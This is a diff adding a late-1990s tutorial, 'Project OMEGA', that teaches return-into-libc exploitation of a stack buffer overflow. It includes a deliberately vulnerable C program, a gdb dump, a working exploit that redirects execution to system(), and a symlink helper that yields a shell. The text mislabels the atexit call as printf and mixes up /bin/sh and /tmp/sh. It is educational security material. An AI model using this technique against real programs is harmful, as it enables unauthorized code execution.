@@ -1,0 +1,292 @@
+
+				  Project OMEGA
+  			      =-=-=-=-=-=-=-=-=-=-=-=
+				by Lamagra <access-granted@geocities.com>
+
+This guide discribes a new way of exploiting bufferoverflows. This method is still in it's beta-fase, so it might be a little crappy. 
+I started this project because i was hated the old method: guessing the offset, making shellcode,etc. I wanted to create a way to exploit it without the trouble of guessing, so i started thinking.....
+
+-----[ Introduction
+
+When a program starts it maps the libraries into it's memory. Every function gets its own address.
+Instead of calling shellcode, we could call one of those functions. The overwritten RET will become the address of the function. 
+
+But 
+    1: the addresses of the functions are given at compiling time, so we need some way to get them.
+    2: we need to "pushl" the address of the arguments in the vunerable program.  
+
+----[ Getting it to work
+
+First we make a simple program to exploit.
+
+<++> omega/vunerable.c
+#include <stdio.h>
+#include <stdlib.h>
+
+main(int argc, char **argv)
+{
+ char buf[15];
+
+ if (argc != 2){
+	printf("No args?\n");
+	exit(-1);
+ }
+  printf("%p\n",system);
+  strcpy(buf,argv[1]);
+  printf("%s\n",buf);
+}
+<-->
+
+[lamagra@bubbles omega]$ gcc vunerable.c -ovun
+
+Now we need to get the address of a useful function. If find system() and exit() both very useful: system() for executing a shell and exit() for DoS (turning off daemons). There are several methods to do this, but i use the calculation method. You give the exploit the address of a function in the vunerable program and it calculates the needed address. To get addresses, you can use a debugger (gdb). 
+
+
+[lamagra@bubbles omega]$ gdb vun
+GNU gdb 4.17.0.4 with Linux/x86 hardware watchpoint and FPU support
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(no debugging symbols found)...
+(gdb) disassemble _start
+Dump of assembler code for function _start:
+0x804845c <_start>:	xorl   %ebp,%ebp
+0x804845e <_start+2>:	testl  %edx,%edx
+0x8048460 <_start+4>:	je     0x8048469 <_start+13>
+0x8048462 <_start+6>:	pushl  %edx
+0x8048463 <_start+7>:	call   0x804843c <atexit>
+0x8048468 <_start+12>:	popl   %eax
+0x8048469 <_start+13>:	call   0x804842c <__libc_init_first>
+0x804846e <_start+18>:	popl   %esi
+0x804846f <_start+19>:	leal   0x4(%esp,%esi,4),%eax
+0x8048473 <_start+23>:	movl   %eax,0x8049654
+0x8048478 <_start+28>:	movl   %esp,%edx
+0x804847a <_start+30>:	andl   $0xfffffff8,%esp
+0x804847d <_start+33>:	pushl  %eax
+0x804847e <_start+34>:	pushl  %eax
+0x804847f <_start+35>:	pushl  %edx
+0x8048480 <_start+36>:	pushl  %esi
+0x8048481 <_start+37>:	call   0x80483c0 <_init>
+0x8048486 <_start+42>:	pushl  $0x8048560
+0x804848b <_start+47>:	call   0x804843c <atexit>
+0x8048490 <_start+52>:	popl   %eax
+0x8048491 <_start+53>:	call   0x80484d0 <_start+116>
+0x8048496 <_start+58>:	pushl  %eax
+0x8048497 <_start+59>:	call   0x804844c <exit>
+0x804849c <_start+64>:	hlt    
+0x804849d <_start+65>:	nop    
+0x804849e <_start+66>:	nop    
+0x804849f <_start+67>:	nop    
+0x80484a0 <_start+68>:	pushl  %ebp
+0x80484a1 <_start+69>:	movl   %esp,%ebp
+0x80484a3 <_start+71>:	pushl  %ebx
+0x80484a4 <_start+72>:	movl   $0x80495a0,%ebx
+0x80484a9 <_start+77>:	cmpl   $0x0,0x80495a0
+0x80484b0 <_start+84>:	je     0x80484c0 <_start+100>
+0x80484b2 <_start+86>:	movl   %esi,%esi
+0x80484b4 <_start+88>:	movl   (%ebx),%eax
+0x80484b6 <_start+90>:	call   *%eax
+0x80484b8 <_start+92>:	addl   $0x4,%ebx
+0x80484bb <_start+95>:	cmpl   $0x0,(%ebx)
+0x80484be <_start+98>:	jne    0x80484b4 <_start+88>
+0x80484c0 <_start+100>:	movl   0xfffffffc(%ebp),%ebx
+0x80484c3 <_start+103>:	leave  
+0x80484c4 <_start+104>:	ret    
+0x80484c5 <_start+105>:	leal   0x0(%esi),%esi
+0x80484c8 <_start+108>:	pushl  %ebp
+0x80484c9 <_start+109>:	movl   %esp,%ebp
+0x80484cb <_start+111>:	leave  
+0x80484cc <_start+112>:	ret    
+0x80484cd <_start+113>:	nop    
+0x80484ce <_start+114>:	nop    
+0x80484cf <_start+115>:	nop    
+0x80484d0 <_start+116>:	pushl  %ebp
+0x80484d1 <_start+117>:	movl   %esp,%ebp
+0x80484d3 <_start+119>:	subl   $0x10,%esp
+0x80484d6 <_start+122>:	cmpl   $0x2,0x8(%ebp)
+0x80484da <_start+126>:	je     0x80484f4 <_start+152>
+0x80484dc <_start+128>:	pushl  $0x804857c
+0x80484e1 <_start+133>:	call   0x804840c <printf>
+0x80484e6 <_start+138>:	addl   $0x4,%esp
+0x80484e9 <_start+141>:	pushl  $0xffffffff
+0x80484eb <_start+143>:	call   0x804844c <exit>
+0x80484f0 <_start+148>:	addl   $0x4,%esp
+0x80484f3 <_start+151>:	nop    
+0x80484f4 <_start+152>:	pushl  $0x804841c
+0x80484f9 <_start+157>:	pushl  $0x8048586
+0x80484fe <_start+162>:	call   0x804840c <printf>
+0x8048503 <_start+167>:	addl   $0x8,%esp
+0x8048506 <_start+170>:	movl   0xc(%ebp),%eax
+0x8048509 <_start+173>:	addl   $0x4,%eax
+0x804850c <_start+176>:	movl   (%eax),%edx
+0x804850e <_start+178>:	pushl  %edx
+0x804850f <_start+179>:	leal   0xfffffff0(%ebp),%eax
+0x8048512 <_start+182>:	pushl  %eax
+0x8048513 <_start+183>:	call   0x80483fc <strcpy>
+0x8048518 <_start+188>:	addl   $0x8,%esp
+0x804851b <_start+191>:	leal   0xfffffff0(%ebp),%eax
+0x804851e <_start+194>:	pushl  %eax
+0x804851f <_start+195>:	pushl  $0x804858a
+0x8048524 <_start+200>:	call   0x804840c <printf>
+0x8048529 <_start+205>:	addl   $0x8,%esp
+0x804852c <_start+208>:	leave  
+0x804852d <_start+209>:	ret    
+0x804852e <_start+210>:	nop    
+0x804852f <_start+211>:	nop    
+0x8048530 <_start+212>:	pushl  %ebp
+0x8048531 <_start+213>:	movl   %esp,%ebp
+0x8048533 <_start+215>:	pushl  %ebx
+0x8048534 <_start+216>:	movl   $0x8049594,%ebx
+0x8048539 <_start+221>:	cmpl   $0xffffffff,0x8049594
+0x8048540 <_start+228>:	je     0x8048550 <_start+244>
+0x8048542 <_start+230>:	movl   %esi,%esi
+0x8048544 <_start+232>:	movl   (%ebx),%eax
+0x8048546 <_start+234>:	call   *%eax
+0x8048548 <_start+236>:	addl   $0xfffffffc,%ebx
+0x804854b <_start+239>:	cmpl   $0xffffffff,(%ebx)
+0x804854e <_start+242>:	jne    0x8048544 <_start+232>
+0x8048550 <_start+244>:	movl   0xfffffffc(%ebp),%ebx
+0x8048553 <_start+247>:	leave  
+0x8048554 <_start+248>:	ret    
+0x8048555 <_start+249>:	leal   0x0(%esi),%esi
+0x8048558 <_start+252>:	pushl  %ebp
+0x8048559 <_start+253>:	movl   %esp,%ebp
+0x804855b <_start+255>:	leave  
+0x804855c <_start+256>:	ret    
+0x804855d <_start+257>:	nop    
+0x804855e <_start+258>:	nop    
+0x804855f <_start+259>:	nop    
+End of assembler dump.
+(gdb) q
+
+(gdb) quit
+
+[lamagra@bubbles omega]$
+
+If you take a look at 0x8048463, you'll see it calls the <printf> function at address 0x804843c.
+Now that we have our little address, we can write an exploit.
+
+<++> omega/exploit.c 
+#include <stdio.h>
+#include <stdlib.h>
+
+#define ATEXIT 0x804843c
+#define BSIZE 30
+
+main()
+{
+  char buf[BSIZE];
+  long *ptr, addr,diff;
+  int i;
+  
+  ptr = (long *)buf;
+
+  diff = (unsigned long)&atexit - (unsigned long)&system;
+
+  addr = ATEXIT - diff;
+  printf("calculated address = 0x%x\n",addr);
+
+
+  for (i=0;i < BSIZE;i+=4)
+	*(ptr++) = addr;
+
+  execl("./vun","vun",buf,0x0);
+}
+<-->
+
+The exploit calculates the difference between the printf and system function in its own memory.
+The system() address of the vunerable program is calculated with the help of this difference.
+
+When we run the exploit we get this output:
+
+[lamagra@bubbles omega]$ gcc -osploit exploit.c
+[lamagra@bubbles omega]$ sploit
+
+calculated address = 0x804841c
+0x804841c
+sh: ˇ%∏ïh: command not found
+sh: »£: command not found
+sh: ñ˛ˇø†˛ˇøÆ˛ˇøÀ˛ˇø€˛ˇøÌ˛ˇø: command not found
+sh: ˇˇøˇˇø#ˇˇøwˇˇøäˇˇøöˇˇø¨ˇˇøπˇˇøÿˇˇøÂˇˇøÌˇˇø: command not found
+Segmentation fault (core dumped)
+[lamagra@bubbles omega]$
+
+We see that the address is calculated correct, but system() "popl"s his arguments from the stack.
+That's why it gives all those strange errors.
+
+We run the exploit again, but this time we put all the errors into a file.
+
+[lamagra@bubbles omega]$ sploit 2> out
+[lamagra@bubbles omega]$
+
+Now we write a program that extracts the filename and makes a symlink to /bin/sh.
+
+***** Note *****
+This part is not needed when you use the exit() function instead of system()
+***************
+
+<++> omega/extract.c
+#include <stdio.h>
+#include <fcntl.h>
+
+void main(int argc, char **argv)
+{
+  FILE *fd;
+  int i;
+  char buf[512],filename[50];
+  char *extract;
+
+  if (argc != 2){
+       printf("usage: %s <file>\n",argv[0]);
+       exit(-1);
+  }
+  fd = fopen(argv[1],"r"); 
+  fgets(buf,512,fd);
+  extract = strrchr(buf,':');
+  *extract = 0x0;
+  extract = strchr(buf,':');
+  strcpy(filename,extract+2);
+  printf("filename = %s\n",filename);
+  fclose(fd);
+
+  symlink("/tmp/sh",filename);
+} 
+<-->
+**** Warning ****
+This program is dumb and quickly made. It has no errorchecking at all.
+*****************
+
+We run the program to create a symlink from /bin/sh to the filename
+
+[lamagra@bubbles omega]$ gcc extract.c -o extract
+[lamagra@bubbles omega]$ extract out
+[lamagra@bubbles omega]$
+
+We exploit the program again and get a shell.
+
+[lamagra@bubbles omega]$ sploit
+calculated address = 0x804841c
+0x804841c
+Å‡
+[lamagra@bubbles omega]$
+
+-----[ Outro
+
+There are many advantages to this way, but also a lot of disadvantages.
+Remember this method is only in development.
+
+
+----[ Copyrights
+
+This exploit method is developed under the terms of the GNU licence.
+Please do not take credit for this, I (lamagra) spend time on this.
+
+
+Have a lot of overflowing fun
+
+     lamagra
+
+
